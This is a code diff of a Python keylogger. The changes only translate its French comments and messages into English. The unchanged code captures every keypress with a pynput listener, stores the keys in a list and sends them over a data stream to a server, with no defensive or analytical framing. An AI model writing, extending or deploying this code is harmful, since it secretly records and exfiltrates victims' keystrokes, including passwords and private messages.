@@ -4,7 +4,7 @@ key_log = []
 
 def log_keystrokes(key):
     """
-    Capture les touches pressées et les stocke dans une liste.
+    Listen to pressed keys and append to a list
     """
     try:
         key_log.append(key.char)
@@ -16,18 +16,18 @@ def log_keystrokes(key):
 
 def start_keylogger():
     """
-    Initialise le keylogger dans un thread séparé.
+    init keylogger in a separate thread
     """
     with Listener(on_press=log_keystrokes) as listener:
         listener.join()
 
 def send_keylogs(data_stream):
     """
-    Envoie les données du keylogger au serveur.
+    send keys to server
     """
     if key_log:
         logs = "".join(key_log)
         data_stream.send(str.encode(f"Keylogs:\n{logs}\n"))
         key_log.clear()  # Vide le journal après l'envoi
     else:
-        data_stream.send(str.encode("Aucune frappe enregistrée.\n"))
+        data_stream.send(str.encode("not keys pressed.\n"))
